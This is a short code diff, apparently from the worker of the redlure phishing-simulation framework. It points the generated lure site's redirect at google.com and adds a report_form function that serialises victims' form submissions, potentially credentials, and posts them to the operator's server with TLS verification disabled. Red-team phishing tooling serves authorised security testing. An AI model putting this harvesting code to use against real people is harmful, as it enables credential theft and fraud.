@@ -10,6 +10,7 @@ sys.path.append('..')
 from config import Config
 import psutil
 from signal import SIGTERM
+import json
 
 app_dir = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))
 configs = Config
@@ -51,7 +52,7 @@ def write_to_disk(campaign):
     # create campaigns/<id>/app/routes.py
     routes_template = Template(open(os.path.join(app_dir, 'templates', 'routes.txt')).read())
 
-    values = {'url1': '/', 'url2': '/', 'url3': '/','url4': '/', 'url5': '/', 'redirect_url': '/'}
+    values = {'url1': '', 'url2': '', 'url3': '','url4': '', 'url5': '', 'redirect_url': 'https://google.com'}
     values['url1'] = '/google'
 
     with open(os.path.join(campaign_dir, 'app', 'routes.py'), 'w') as f:
@@ -84,6 +85,21 @@ def report_action(tracker, action):
     url = 'https://%s:%d/results/update' % (configs.SERVER_IP, configs.SERVER_PORT)
     params = {'key': configs.API_KEY}
     payload = {'tracker': tracker, 'action': action}
+    try:
+        r = requests.post(url, data=payload, params=params, verify=False)
+    except:
+        pass
+
+
+def report_form(tracker, form_data):
+    '''
+    Report a form submission with a target ID to the redlure server
+    '''
+    print('sending form data')
+    data = json.dumps(form_data.to_dict(flat=False))
+    url = 'https://%s:%d/results/form' % (configs.SERVER_IP, configs.SERVER_PORT)
+    params = {'key': configs.API_KEY}
+    payload = {'tracker': tracker, 'data': data}
     try:
         r = requests.post(url, data=payload, params=params, verify=False)
     except:
